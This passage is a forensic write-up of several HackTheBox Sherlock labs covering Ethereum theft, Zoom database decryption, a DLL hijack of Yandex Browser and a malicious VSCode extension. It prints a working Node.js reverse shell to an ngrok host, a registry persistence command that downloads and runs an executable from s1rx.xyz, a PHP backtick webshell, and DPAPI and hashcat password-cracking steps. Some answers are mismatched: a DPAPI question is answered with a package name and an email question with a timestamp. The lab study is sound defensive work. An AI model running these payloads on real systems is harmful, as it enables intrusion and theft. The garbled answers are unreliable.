But I cannot find the method related to transaction-sending, we just have transaction getting.
- Filter packets whose protocol is `POST` and timestamp is after `2025-03-01 04:22:01`:
![image](https://hackmd.io/_uploads/ryBAksdcGg.png)
When I checked for packet no. 1498, I saw this method:
![image](https://hackmd.io/_uploads/Hk1MejO9Mx.png)
- Filter packets that contains the information of attacker's sending behaviour by the method that we have just found:
![image](https://hackmd.io/_uploads/SkK8eod5Ge.png)
Check for the first packet whose timestamp is after `04:09:22`:
![image](https://hackmd.io/_uploads/ryl5KZOcGe.png)
We know that this is the first transaction because of the `0x0` nonce, and its value is `0x1bc16d674ec80000`. It was a successful transaction because of the status `0x1`:
![image](https://hackmd.io/_uploads/BkgZo-OqMl.png)
Scroll down, check for the result of method `method":"eth_sendRawTransaction`, whose `id` is `12`:
![image](https://hackmd.io/_uploads/rJ9ZcbdcMl.png)
Its hash is `0x7b7ded2d51f0dcb1bf3fc5cc9598b81a7a622aac15d3841d377c548986e0a7c3`.

**Answer:** `0x7b7ded2d51f0dcb1bf3fc5cc9598b81a7a622aac15d3841d377c548986e0a7c3`

#### 13. What was the total amount of Ether stolen by the attacker? (1 Eth = 10^18 wei
Similarly, check for the next packets to find the value of successful transactions that have the same recepient (`0x82b03246a287e5ed681b967cbd9b610a24bd5ef9`):
![image](https://hackmd.io/_uploads/HJaMh-O9Gl.png)
![image](https://hackmd.io/_uploads/SkT92b_5zl.png)
![image](https://hackmd.io/_uploads/SyoA3ZucGe.png)
![image](https://hackmd.io/_uploads/BylOpbO5Gl.png)
![image](https://hackmd.io/_uploads/S1Hnabdqzx.png)
![image](https://hackmd.io/_uploads/S1nlCWd9fx.png)
![image](https://hackmd.io/_uploads/rybt0ZOqMe.png)
Then run the below code:
``` py
print(sum(int(x,16) for x in ['1bc16d674ec80000','29a2241af62c0000','3782dace9d900000', '29a2241af62c0000', '2c68af0bb1400000', '1e87f85809dc0000', '3e73362871420000', '22b1c8c1227a0000'])/10**18)
```
**Answer:** `24.4`

#### 14. What is the block number of the last transaction in which Ether was stolen? (Decimal)
In the last transaction, check for the response of `eth_getTransactionByHash` method:
![image](https://hackmd.io/_uploads/r198xzd5Mg.png)
The block number is `0x12`. Run the code below to transfer from hex to dec:
``` py
print(int('0x12',16))
```
There are `18` block number.

**Answer:** `18`

#### 15. After the attacker stole the Ether, what was the balance in their wallet? (Ignore the trailing zeros)
In `rk-sever.js`, we can check the function related to balance of the wallet:
![image](https://hackmd.io/_uploads/rJ-P9cu5fl.png)
![image](https://hackmd.io/_uploads/SkZI35u9Ge.png)
![image](https://hackmd.io/_uploads/HJpVq9_qfl.png)
Filter packets that contains the information related to checking for the last balance of attacker:
![image](https://hackmd.io/_uploads/H19gYMd5fl.png)
Check for its HTTP Stream:
![image](https://hackmd.io/_uploads/ryLwtfO9fx.png)
Run the following code:
``` py
print(sum(int(x,16) for x in ['1529f07e833d46000'])/10**18)
```

**Answer:** `24.40023`

### XIII. CrewCrow:
> - Link lab: https://app.hackthebox.com/sherlocks/CrewCrow?tab=play_sherlock
> - Đề bài:
> ![image](https://hackmd.io/_uploads/Hy44qBa9Gx.png)
> - File tham khảo: [MT_OHoffmann.pdf](https://it-forensik.fiw.hs-wismar.de/images/8/8e/MT_OHoffmann.pdf)

#### 1. Identify the conferencing application used by CrewCrow members for their communications.
Using FTK Imager to analyse this challenge. In `C/Users/Nefarious/Desktop/CrewCrow_Terms_and_Conditions.txt`:
![image](https://hackmd.io/_uploads/H1IRoK0qze.png)
They use Zoom for their meeting.

**Answer:** `Zoom`

#### 2. Determine the last time Nefarious used the conferencing application.
In `C/Windows/Prefetch/`, we have `ZOOM.EXE-F882A381.pf`. Analyse this file by PECmd:
![image](https://hackmd.io/_uploads/SkIUJ9AcGg.png)
The last time this meeting application runned is `2024-07-16 09:02:02`.

**Answer:** `2024-07-16 09:02:02`

#### 3. Where is the conferencing application's data stored?
Its data is stored in `C:\Users\Nefarious\AppData\Roaming\Zoom\data`:
![image](https://hackmd.io/_uploads/rkMag5R5Me.png)

**Answer:** `C:\Users\Nefarious\AppData\Roaming\Zoom\data`

#### 4. Which Windows data protection service is used to secure the conferencing application's database files?
It uses DPAPI to protect its database:
![image](https://hackmd.io/_uploads/HJj_Z5Aczg.png)

**Answer:** `hardhat@2.22.18`

#### 5. Determine the sign-in option used by Nefarious.
In the above image, they said that Windows password of the user will be used in DPAPI.
![image](https://hackmd.io/_uploads/Sywqv905Ge.png)
Beside that, some sign-in option in Windows:
![image](https://hackmd.io/_uploads/r1Cy_50qGg.png)
I guess that `Password` is the correct answer.

**Answer:** `Password`


#### 6. Retrieve the password used by Nefarious
- Check for `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, maybe there has `DefautPassword` in there:
![image](https://hackmd.io/_uploads/S1Nt_5AqMl.png)
But there is nothing :) Search the information of WinLogon, I found that the password will be store in LSA:
![image](https://hackmd.io/_uploads/Hk77Y50cGl.png)
- Check for `SECURITY\Policy\Secrets`:
![image](https://hackmd.io/_uploads/HJK8F9C5Ml.png)
![image](https://hackmd.io/_uploads/ryZ5Y9R5Ge.png)
`DefaultPassword` was deleted.
- Try using Mimikatz to dump the secret, but I cannot find the password by this way:
![image](https://hackmd.io/_uploads/BkRZ69C5Ml.png)
But we have some important data.
- To find the user masterkey, I need the user masterkey file in `C:\Users\Nefarious\AppData\Roaming\Microsoft\Protect\`:
![image](https://hackmd.io/_uploads/H1qZMiC5zl.png)
According to the above image, `SID` user is `S-1-5-21-3675116117-3467334887-929386110-1001`. Using `DPAPImk2john` to generate hash:
![image](https://hackmd.io/_uploads/HJv5soA9fx.png)
Because there are 15 characters in the password, we will filter strings having 15 chars in `rockyou.txt`, then using `hashcat` to crack the password:
![image](https://hackmd.io/_uploads/rJnF42CcGg.png)
![image](https://hackmd.io/_uploads/HyxbShC5fl.png)

**Answer:** `ohsonefarious92`

#### 7. Find the key derivation function iterations used in the encryption process of the conferencing application's database.
There are three database files of Zoom in `C:\Users\Nefarious\AppData\Roaming\Zoom\data\`:
![image](https://hackmd.io/_uploads/HyZWIA1oMl.png)
In [this link](https://www.reddit.com/r/computerforensics/comments/kch7ot/zoom_artifacts_encrypted_dbs/), I saw some details about database of Zoom is encrypted:
![image](https://hackmd.io/_uploads/Hy6lcCkiMl.png)
The above script used to decrypt `zoomus.enc.db`. In this script:
```
PRAGMA kdf_iter = '4000';
PRAGMA cipher_page_size = 1024;
```
[SQLCipher](https://www.zetetic.net/sqlcipher/design/) is used to encrypted database of Zoom.
> We can get the answer in `MT_OHoffmann.pdf`:
> ![image](https://hackmd.io/_uploads/SkiDhxesGx.png)

**Answer:** `4000`

#### 8. Find the key derivation function page size used in the encryption process.
According to the last question.

**Answer:** `1024`

#### 9. Identify Nefarious email address.
Because of the encrypted database, we cannot open these file directly:
![image](https://hackmd.io/_uploads/BygD20koGl.png)
I found [this link](https://infosecwriteups.com/decrypting-zoom-team-chat-forensic-analysis-of-encrypted-chat-databases-394d5c471e60) guiding how to decrypt `.db`, so I will follow it.

##### Finding the main_key linked to the main database:
> In reference file:
> ![image](https://hackmd.io/_uploads/SyQUTggszl.png)

`zoom.us.ini` contains the key to decrypt the main database, and it is encrypted by DPAPI.
![image](https://hackmd.io/_uploads/HJenzJeiGl.png)
Its content:
```
[ZoomChat]
win_osencrypt_key=ZWOSKEYAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAANKu7KG7QckOmM9kk+6swGwAAAAACAAAAAAAQZgAAAAEAACAAAADJx9AI6i9CEvRYhIK10gayvm5YyrBN9LxAjHylMKgQ0QAAAAAOgAAAAAIAACAAAAC2EfbilZ5wE8mRW0xeUP0IcyQCufOYKa7MbOFXLSdvBzAAAAB94pzf6DE7fRhpJ2tbIsw3ZtYaDKlb3ncvT16Jlwj44rMGIbIYWZtMBVbRV1U8PwNAAAAARwtW+e31mKSZeh4igd735aC1hB4J/8Ye93i0IhDeXBMFbAMWWBwLz77OuZa8spLkcKfYpGQF63fXVvJkxjmnpA==
com.zoom.client.langid=1033
```
It starts with marker `ZWOSKEY`, the next is a long base64 code. To extract the encrypted key, we have to parse the value of `win_osencrypt_key` and bypass the `ZWOSKEY` prefix, leaving the base64-encoded DPAPI blob.
![image](https://hackmd.io/_uploads/rJpdPkeizx.png)
Then, we have to find masterkey file and user's password, and we've done this before:
![image](https://hackmd.io/_uploads/B1vPNkeoMl.png)
![image](https://hackmd.io/_uploads/BkJ_Eyxjfl.png)
Dump the masterkey:
![image](https://hackmd.io/_uploads/B1VpYkgiGx.png)
Then use this masterkey and `.blob` to get the data:
![image](https://hackmd.io/_uploads/BJuuqkloGg.png)
Our data is:
```
57 32 6b 2b 30 32 47 7a 42 56 65 5a 4b 4a 68 58 73 6e 52 49 71 4e 72 74 72 57 56 55 42 41 76 73 30 67 4c 4e 65 35 32 7a 58 4b 77 3d
```
Convert it to ASCII, we get the main_key:
![image](https://hackmd.io/_uploads/SythcJlozg.png)
The main_key is `W2k+02GzBVeZKJhXsnRIqNrtrWVUBAvs0gLNe52zXKw=`.

##### Decrypting main database:
Using [DB Browser for SQLite](https://sqlitebrowser.org/dl/) to open `zoomus.enc.db` database:
![image](https://hackmd.io/_uploads/S1V-TJgjMl.png)
![image](https://hackmd.io/_uploads/H1VQp1ejMl.png)
Do a query:
![image](https://hackmd.io/_uploads/H1VxRkxsMl.png)
And we got his email.

**Answer:** `2025-03-01 04:22:01`

#### 10. What is the Meeting ID?
We can see that most of the data in `zoom_user_account_enc` is encrypted:
![image](https://hackmd.io/_uploads/HyIWlleifg.png)
In [this link](https://www.sciencedirect.com/science/article/pii/S2666281721000019#sec5), I found that the value of Meeting ID is held in `zoom_kv` table:
![image](https://hackmd.io/_uploads/rksqGeesGx.png)
Some fields in this table:
![image](https://hackmd.io/_uploads/S1JAMegszg.png)
I found the following pair of key and value:
![image](https://hackmd.io/_uploads/SyjaQeesMe.png)
Its value:
```
RNpZaXfokRphhecoO6sHn9U02wtiPGaxi8UuhoAMGM2MEe175kZQQ2d7/Bk6WjUc4bz5EFCFpvrwYy/KTd56mA==
```
In page 54 of `MT_OHoffmann.pdf`:
![image](https://hackmd.io/_uploads/r1KrybxsGx.png)
In general, this field is encrypted by AES-256-CBC, with the key is user SID and the IV is SHA-256 of user SID. So, we have the following decrypted script:
``` py
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

sid = b"S-1-5-21-3675116117-3467334887-929386110-1001"
key = hashlib.sha256(sid).digest()
iv = hashlib.sha256(key).digest()[:0x10]

data_b64 = "RNpZaXfokRphhecoO6sHn9U02wtiPGaxi8UuhoAMGM2MEe175kZQQ2d7/Bk6WjUc4bz5EFCFpvrwYy/KTd56mA=="
cipher_text = base64.b64decode(data_b64)

cipher = AES.new(key, AES.MODE_CBC, iv)
plain_text = unpad(cipher.decrypt(cipher_text), AES.block_size)
print(plain_text)
```
Our output is `86233834426|Nefarious Leet's Zoom Meeting;100000`.

**Answer:** `86233834426`

#### 11. Retrieve the password used to encrypt the plan PDF file from the meeting chat.
I found this information:
![image](https://hackmd.io/_uploads/rJXAmWxoGx.png)
Make a query in `zoomeeting.enc.db`, and I see the password, as well as all the messages in the meeting:
![image](https://hackmd.io/_uploads/H1qt4ZljGl.png)
```
S1mple please send the plan file so we all can have a look while we're discussing the plan.

Ok Boss

The password is "EOztYmVeUxp6TmV"

CrewCrow gathers, minds so sharp,
Their plan a symphony, dark and stark.

In shadows deep, where whispers bind,
A plot unfolds, by cunning minds.
CrewCrow gathers, sharp and sly,
Their plan a storm beneath the sky.

Funds flow through the darkened streams,
Cryptic trails and silent schemes.
CrewCrow’s shadow fades away,
Leaving chaos in disarray.

Doomsday whispers through the night,
A tale of fear, a tale of might.
From hidden realms their shadows grow,
Leaving behind a world of woe.🫡
```

**Answer:** `EOztYmVeUxp6TmV`

#### 12. Discover the location from which the upcoming cyber-attack will be launched.
There are two child folder of their operation in `C:\Users\Nefarious\Documents\Operations\`:
![image](https://hackmd.io/_uploads/BJw9U-gjzx.png)
All we need for this task is the file in `Pending` folder:
![image](https://hackmd.io/_uploads/rJl4D-liMg.png)
In the plan file:
![image](https://hackmd.io/_uploads/BJPKPZgszx.png)
It's `Eastern Europe`.

**Answer:** `Eastern Europe`

### XIV. Easy Money:
> - Link lab: https://app.hackthebox.com/sherlocks/Easy%2520Money?tab=play_sherlock
> - Đề bài:
> ![image](https://hackmd.io/_uploads/Byxl29gofg.png)

#### 1. At what exact time did the user execute the malicious shortcut file?
In `NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\`, we see there is `.lnk` file whose name is `GiveAways`:
![image](https://hackmd.io/_uploads/SJZvd7ZiGx.png)
The last time that this file was executed is `2025-01-26 16:17:15`.

**Answer:** `2025-01-26 16:17:15`

#### 2. The previous malicious file executed an initial payload. What is the full path of this payload?
After checking for BAM, DAM, Prefetch File, `NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\` and found nothing, I check `$MFT` by using MFTExplorer. And I see all the directory in user's computer, including `2025-GiveAways.lnk` in `Downloads`:
![image](https://hackmd.io/_uploads/r1IlWN-szg.png)
In `C:\Temp\`:
![image](https://hackmd.io/_uploads/ryPwQE-iMx.png)
There is an `.exe` file created in `16:17:17`, and its name is `svchOst.exe`, instead of `svchost.exe`. This is so suspicious. Besides that, if I check for `Windows PowerShell.evtx`:
![image](https://hackmd.io/_uploads/BJ6JPNWoMl.png)
The above PowerShell script download `svchOst.exe` from https://github.com/M4shl3/okiii/raw/main/svchost.exe.

**Answer:** `C:\Temp\svchOst.exe`

#### 3. At what timestamp did the payload execute and grant the attacker shell access?
The last accessed time of `svchOst.exe` is `2025-01-26 16:17:54`.

**Answer:** `2025-01-26 16:17:54`

#### 4. What is the command line the attacker used to enumerate installed packages on the system?
In `Windows PowerShell.evtx`:
![image](https://hackmd.io/_uploads/By59PVWoMe.png)

**Answer:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command Get-Package`

#### 5. Which application did the attacker identify as vulnerable?
Finding applications in `NTUSERS.DAT\SOFTWARE\Microsoft\Windows\CurrentVersion\Unistall`:
![image](https://hackmd.io/_uploads/BkALHaWjfl.png)
Search in Google:
![image](https://hackmd.io/_uploads/rkIRnaWsMx.png)
This application can be attacked by hijacking through a unstrusted path to download an `.dll`. Check for history of browser in `C\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\History`:
![image](https://hackmd.io/_uploads/SyPkJR-ozg.png)
Make a query:
![image](https://hackmd.io/_uploads/S1O0RaZizx.png)
Beside that, I saw this message:
![image](https://hackmd.io/_uploads/HkEw5N-sMx.png)
![image](https://hackmd.io/_uploads/r1K_qVZsfe.png)
This means something is in danger, the timestamp of this event is about `16:38`. Using MFTCmd to extract a `.csv` file to find the timestamp around `16:38`, when a file is created:
![image](https://hackmd.io/_uploads/Sy84zrZjfl.png)
Here I saw some files, especially `.dll`:
![image](https://hackmd.io/_uploads/rJ1djp-iMg.png)
I guess that application is `YandexBrowser`.

**Answer:** `YandexBrowser`

#### 6. What version of that vulnerable application did the attacker identify?
Beside the above question, in `Program Files (x86)`:
![image](https://hackmd.io/_uploads/rywtKHZsMe.png)
Its version is `24.4.5.498`.

> We can also find the information of Yandex in `Amcache.hve`:
> ![image](https://hackmd.io/_uploads/By7Fntzszx.png)

**Answer:** `24.4.5.498`

#### 7. What is the CVE associated with this vulnerability?
Search the name and version of this vulnerable application on Google:
![image](https://hackmd.io/_uploads/SycicS-ofe.png)
It's `CVE-2024-6473`.

**Answer:** `CVE-2024-6473`

#### 8. What is the name of the legitimate binary that the attacker used to deliver the malicious payload and establish persistence on the compromised system?
Check for prefetch file having timeline around `16:36`.
![image](https://hackmd.io/_uploads/rkdqh0-iGl.png)
They was downloaded by `CERTUTIL.EXE` at `16:36`. 
**Answer:** `certutil.exe`

#### 9. What is the name of the malicious Portable Executable (PE) file that enabled him to accomplish his objective?
We've found this before:
![image](https://hackmd.io/_uploads/ByXxuFzoGl.png)

**Answer:** `wldp.dll`

#### 10. What is the SHA-256 hash of that malicious file?
At the same timestamp when `wldp.dll` was downloaded:
![image](https://hackmd.io/_uploads/B10bNqMoGg.png)
`C:\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache` is the cache folder of CryptoAPI (Windows crypt32), the filename in this folder is MD5 of download URL used to check digital signs or certificates. I will find the information of `A16B2E6DE64B13EDF2C00F32C4559930` because it has the same size of `wldp.dll`:
![image](https://hackmd.io/_uploads/SJ_aSqfsGl.png)
And its signature byte starts with `MZ`, so this is `.exe` file:
![image](https://hackmd.io/_uploads/r1ozL9MoGl.png)
Get its SHA256:
![image](https://hackmd.io/_uploads/r1NnD5zozg.png)

**Answer:** `A1A17EBD90610D808E761811D17DA3143F3DE0D4CC5EE92BD66000DCA87D9270`

#### 11. How many milliseconds of cumulative coded sleep delays occurred before the C2 binary provided a shell after the vulnerable application was launched?
Let's Detect It Easy:
![image](https://hackmd.io/_uploads/HyhFucMoze.png)
This malicious file was writed in C++, so we will use IDA to analyse it:
![image](https://hackmd.io/_uploads/H1E_WRQjzx.png)
![image](https://hackmd.io/_uploads/ryGK-CmsGe.png)
`2710` is `10000` in dec, and `3E8` is `1000`
**Answer:** `11000`

#### 12. What is the mutex name used to ensure only one instance of the C2 binary runs at a time?
![image](https://hackmd.io/_uploads/H1fxbAXiGl.png)

**Answer:** `Global\\YandaExeMutex`

#### 13. What is the full path of the Command and Control (C2) Binary?
![image](https://hackmd.io/_uploads/ryS7WRXsfg.png)
![image](https://hackmd.io/_uploads/SJcKppXifx.png)

**Answer:** `C:\Users\Administrator\AppData\Local\Temp\yanda.tmp`

#### 14. What is the name of the C2 framework used by the attacker?
According to and similar to task 10, upload `yanda.tmp` (or `DE69F438F13416BEDB3F9D0DBC8165A8` in `C\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`) in VirusTotal:
![image](https://hackmd.io/_uploads/rJOom0XiMx.png)

**Answer:** `sliver`

#### 15. What is the IP address and port number of the malicious C2 server used by the attacker?
In VirusTotal:
![image](https://hackmd.io/_uploads/B1vgERmozx.png)

**Answer:** `18.192.12.126:8888`

### XV. ReliableThreat:
> - Link lab: https://app.hackthebox.com/sherlocks/ReliableThreat?tab=play_sherlock
> - Đề bài:
![image](https://hackmd.io/_uploads/r1S6cA7oMx.png)

#### 1. What is the application that starts the suspicious chain of processes?
Using Volatility 3 to check `pstree` and `pslist`:
![image](https://hackmd.io/_uploads/B1cxs2iiMx.png)
![image](https://hackmd.io/_uploads/HJ_8snoiGe.png)
As we can see, process `Code.exe`, whose PID is `1612`, created a lot of child process. We have the two of suspicuois sequences: `Code.exe` $\rightarrow$ `cmd.exe` (PID `4196`) $\rightarrow$ `RuntimeBroker.exe` (PID `1224`) and `Code.exe` $\rightarrow$ `devsense.php.l` (PID `8332`).

**Answer:** `Code.exe`

#### 2. Provide the full path of the malicious file used to gain initial access.
Check for `cmdline` plugin of these processes:
![image](https://hackmd.io/_uploads/ry5iphoszx.png)
In the last PID, its path refers to `extension`, so I will `grep` this keyword by using plugin `filescan` and `grep -i "\.vscode\\\\extensions"`:
![image](https://hackmd.io/_uploads/Bk4NJ6ojGg.png)
Filename of the last extension is `0xs1rx58d3v.chatgpt-b0t-0.0.1` instead of `chatgpt-bot` or something else. It can be another AI, and its name different from most of extensions in the output, so I think it is suspicious.

**Answer:** `C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js`

#### 3. What user input, when executed, will run the malicious code?
Dump `C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js` via physicall address that we have found before by using `windows.dumpfiles --physaddr 0x850cd2e704f0`, then read its content:
![image](https://hackmd.io/_uploads/S1ppWpioze.png)
If the user types `help`, an obfuscated script will be executed.

**Answer:** `help`

#### 4. What are the hostname and port used to establish a reverse shell?
Using [Obfuscator.io Deobfuscator](https://obf-io.deobfuscate.io/) to deobfuscate the above script and I get this:
``` js
const fs = require('fs');
const net = require("net");
const path = require("path");
const os = require('os');
const {
  pid
} = require("process");
const lockFilePath = path.join(os.homedir(), '.' + pid + ".lock");
if (!fs.existsSync(lockFilePath)) {
  fs.writeFile(lockFilePath, '', _0x2452ba => {
    if (_0x2452ba) {
      console.error(_0x2452ba);
    }
  });
  (function () {
    const _0x3db126 = new net.Socket();
    _0x3db126.connect(16587, "6.tcp.eu.ngrok.io");
    _0x3db126.on("data", _0xd34d07 => {
      const _0x45fcf2 = _0xd34d07.toString();
      require("child_process").exec(_0x45fcf2, (_0x460220, _0x254585, _0x3aa38b) => {
        if (_0x460220) {
          _0x3db126.write(_0x3aa38b);
        } else {
          _0x3db126.write(_0x254585);
        }
      });
    });
    _0x3db126.on("close", () => {
      console.log("closed");
    });
    return /a/;
  })();
}
```
The above script connect to `6.tcp.eu.ngrok.io` server at port `16587`, then it will drop a file whose name has the form like `<process PID>.lock`. But I cannot find this file via `filescan`.

**Answer:** `6.tcp.eu.ngrok.io:16587`

#### 5. What is the display name of the developer who created this malicious file?
`0xS1rx58D3V` is the publisher, but not his display name, so I have to found more information of this . When looking for [required files for VSCode extension](https://code.visualstudio.com/api/get-started/extension-anatomy), I found this:
![image](https://hackmd.io/_uploads/rJkk46jjMe.png)
![image](https://hackmd.io/_uploads/Sy4wSTijMe.png)
And the format of a sample extension. When try dumping `package.json`, I cannot find this file via `filescan`, so I tried some `grep`:
![image](https://hackmd.io/_uploads/SyKTrasszl.png)
![image](https://hackmd.io/_uploads/B1ZnIpjsMl.png)
I have found the `publisherDisplayName`.

**Answer:** `0xS1rx58.D3V`

#### 6. What time was the malicious file released? (UTC).
When searching for the publisher and his extension, I found nothing, but [History of Extensions Removed from VS Marketplace](https://github.com/microsoft/vsmarketplace/blob/main/RemovedPackages.md):
![image](https://hackmd.io/_uploads/rkVww6soze.png)
This extension has been removed from VSCode, however, I found that URL to a VSCode extension has the format like:
![image](https://hackmd.io/_uploads/H1nAvTjjfl.png)
```
https://marketplace.visualstudio.com/items?itemName=<name_of_extension>
```
Trying searching for 
`https://marketplace.visualstudio.com/items?itemName=0xS1rx58D3V.ChatGPT-B0T` on the Google:
![image](https://hackmd.io/_uploads/S1kO_Tisze.png)
But we have [WaybackMachine](https://web.archive.org/web/20240729231959/https://marketplace.visualstudio.com/items?itemName=0xS1rx58D3V.ChatGPT-B0T&ssr=false#overview):
![image](https://hackmd.io/_uploads/r1qXhdqiMl.png)

**Answer:** `2024-07-23 00:41:19`

#### 7. Provide the SID for the user who has been compromised.
The SID of user is contained in `C:\Users\User2\AppData\Roaming\Microsoft\Protect\`, so `grep` for the `Protect` keyword:
![image](https://hackmd.io/_uploads/HyBVt6jifl.png)

**Answer:** `S-1-5-21-1998887770-13753423-1649717590-1001`

#### 8. Provide the full path of the suspicious executable being run during the infection chain.
As the analysed chain in task 1:
![image](https://hackmd.io/_uploads/H1K6DF9sfg.png)

**Answer:** `C:\Users\Public\RuntimeBroker.exe`

#### 9. The threat actor has modified the Windows registry to include a new entry. This change ensures that whenever a legitimate component runs, it triggers the malicious process, allowing the threat actor to maintain control of the system. Specify the name of the legitimate component.
I dumped `RuntimeBroker.exe` and analysed it via DIE:
![image](https://hackmd.io/_uploads/H1KLjt9iMg.png)
Then using IDA to find something:
``` code
void start()
{
  int v0; // r10d
  struct _LIST_ENTRY *i; // rdx
  __int64 v2; // rcx
  int v3; // r9d
  struct _LIST_ENTRY *Flink; // rsi
  int Flink_low; // eax
  struct _LIST_ENTRY *v6; // rdx
  char *v7; // rax
  __int64 v8; // rax
  char *v9; // rax
  char *v10; // r8
  __int64 v11; // rcx
  int v12; // r9d
  unsigned __int8 *v13; // rsi
  int v14; // eax
  char *v15; // [rsp-10h] [rbp-48h]
  int v16; // [rsp-8h] [rbp-40h]
  struct _LIST_ENTRY *v17; // [rsp+0h] [rbp-38h]

  sub_1400040D6();
  for ( i = NtCurrentPeb()->Ldr->InMemoryOrderModuleList.Flink; ; i = v17->Flink )
  {
    v2 = WORD1(i[4].Blink);
    v3 = 0;
    Flink = i[5].Flink;
    do
    {
      Flink_low = LOBYTE(Flink->Flink);
      Flink = (struct _LIST_ENTRY *)((char *)Flink + 1);
      if ( (char)Flink_low >= 97 )
        LOBYTE(Flink_low) = Flink_low - 32;
      v3 = Flink_low + __ROR4__(v3, 13);
      --v2;
    }
    while ( v2 );
    v17 = i;
    v16 = v3;
    v6 = i[2].Flink;
    v7 = (char *)v6 + HIDWORD(v6[3].Blink);
    if ( *((_WORD *)v7 + 12) == 523 )
    {
      v8 = *((unsigned int *)v7 + 34);
      if ( v8 )
      {
        v9 = (char *)v6 + v8;
        v10 = (char *)v6 + *((unsigned int *)v9 + 8);
        v11 = *((unsigned int *)v9 + 6);
        v15 = v9;
        while ( v11 )
        {
          v12 = 0;
          --v11;
          v13 = (unsigned __int8 *)v6 + *(unsigned int *)&v10[4 * v11];
          do
          {
            v14 = *v13++;
            v12 = v14 + __ROR4__(v12, 13);
          }
          while ( (_BYTE)v14 != BYTE1(v14) );
          if ( v16 + v12 == v0 )
          {
            LOWORD(v11) = *(_WORD *)((char *)&v6->Flink + 2 * v11 + *((unsigned int *)v15 + 9));
            __asm { jmp     rax }
          }
        }
      }
    }
  }
}
```
It is a ROT13 script, but there is nothing related to Registry Key-changing here. Using FTK Imager to check the `C:\Users\Public\` folder:
![image](https://hackmd.io/_uploads/rkC87fsszl.png)
There is a malicious `.exe`, try examining it in IDA:
``` code
int __fastcall main(int argc, const char **argv, const char **envp)
{
  DWORD v3; // eax
  HKEY v5; // [rsp+58h] [rbp-28h] BYREF
  HKEY hKey; // [rsp+60h] [rbp-20h] BYREF
  LSTATUS v7; // [rsp+6Ch] [rbp-14h]
  char *Str; // [rsp+70h] [rbp-10h]
  LPCSTR lpSubKey; // [rsp+78h] [rbp-8h]

  _main();
  hKey = 0;
  v5 = 0;
  lpSubKey = "SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell";
  Str = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Powershell.exe -ExecutionPolicy Bypass -Command \"(New-Object Ne"
        "t.WebClient).DownloadFile('http://s1rx.xyz/tmp.exe', 'C:\\Windows\\Temp\\tmp.exe'); Start-Process 'C:\\Windows\\"
        "Temp\\tmp.exe'\"";
  v7 = RegOpenKeyExA(
         HKEY_LOCAL_MACHINE,
         "SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell",
         0,
         0x20006u,
         &hKey);
  if ( !v7 )
  {
    v7 = RegCreateKeyExA(hKey, "open\\command", 0, 0, 0, 0xF003Fu, 0, &v5, 0);
    if ( !v7 )
    {
      v3 = strlen(Str);
      RegSetValueExA(v5, 0, 0, 1u, (const BYTE *)Str, v3);
      RegCloseKey(v5);
    }
    RegCloseKey(hKey);
  }
  return 0;
}
```
This script changes the key in `SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell`, it belongs to Recycle Bin:
![image](https://hackmd.io/_uploads/r1CyUGoofx.png)

**Answer:** `Recycle Bin`

#### 10. Which MITRE technique corresponds to the previous action?
I found this [MITRE](https://attack.mitre.org/techniques/T1546/015/):
![image](https://hackmd.io/_uploads/BkeuOMiifx.png)

**Answer:** `T1546.015`

#### 11. The threat actor has identified the location for all projects and manipulated one of the project files. Could you provide details about the malicious code that was added by the threat actor?
We know that the extension dropped something like `.php`, attackers always tend to obfuscate or use execute function instead of direct code-writing. There are some function used for RCE like `eval(`, `system(`, `shell_exec(`, `passthru(`, `exec(`, `assert(`, or encode functions like `base64_decode(`, `gzinflate(`, `str_rot13(`, or get the command via request, such as `$_POST`, `$_GET`, `$_REQUEST`, `$_COOKIE`, `$_SERVER['HTTP_USER_AGENT']`. Because we have the numbers character of this malicious code as a hint, so I will filter the partern matching to what we know.
- Dump the `Object` folder:
![image](https://hackmd.io/_uploads/BJJHaaosfl.png)
- Filtering by available strings:
    ``` terminal
    grep -rnE '\$[^ ]+ +[^ ]+ +[^ ]+ +[^;]+;|\$_(POST|GET|REQUEST|COOKIE|SERVER)|\b(eval|system|shell_exec|passthru|exec|assert|base64_decode|gzinflate|str_rot13|file_get_contents|curl_exec|fopen)[[:space:]]*\(' .
    ```
    And I found this:
    ![image](https://hackmd.io/_uploads/ByR10aioMx.png)
    ![image](https://hackmd.io/_uploads/ryQW0ajsze.png)
    Every requests to `Laravel` have to pass through `index.php` first. `$_GET` used to get data from URL, then assign the value of the URL parameter `s1` to the variable `$testc`. For example, if attacker accesss this:
    ```
    http://trangweb.com/index.php?s1=whoami
    ```
    Then the value of `$testc` is `whoami`, and it will be executed after that. This is RCE attack.

**Answer:**
``` php
$testc = $_GET['s1']; echo `$testc`;
```

### XVII. Streamer:
> - Link lab: https://app.hackthebox.com/sherlocks/Streamer?tab=play_sherlock
> - Đề bài:
> ![image](https://hackmd.io/_uploads/BkEZf0ssMe.png)

#### 1. What's the original name of the malicious zip file which the user downloaded thinking it was a legit copy of the software?
I tried to analyse `History` by using DB Sqlite to look for some information related to file-downloading, but I cannot find anything. When check `Desktop` of `Public` user:
![image](https://hackmd.io/_uploads/BkkGbGTszx.png)
There is a software whose name is OBS, and is often used to record the computer screen. So I used `LECmd.exe` to analyse this `.lnk` file:
![image](https://hackmd.io/_uploads/BJCF-zajze.png)
It belongs to our dev, so I will do something with `$MFT` and `$J`:
![image](https://hackmd.io/_uploads/BkYcy7ToGe.png)
![image](https://hackmd.io/_uploads/rJRFlQTjzx.png)
And in `NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\` of `Simon.stark`:
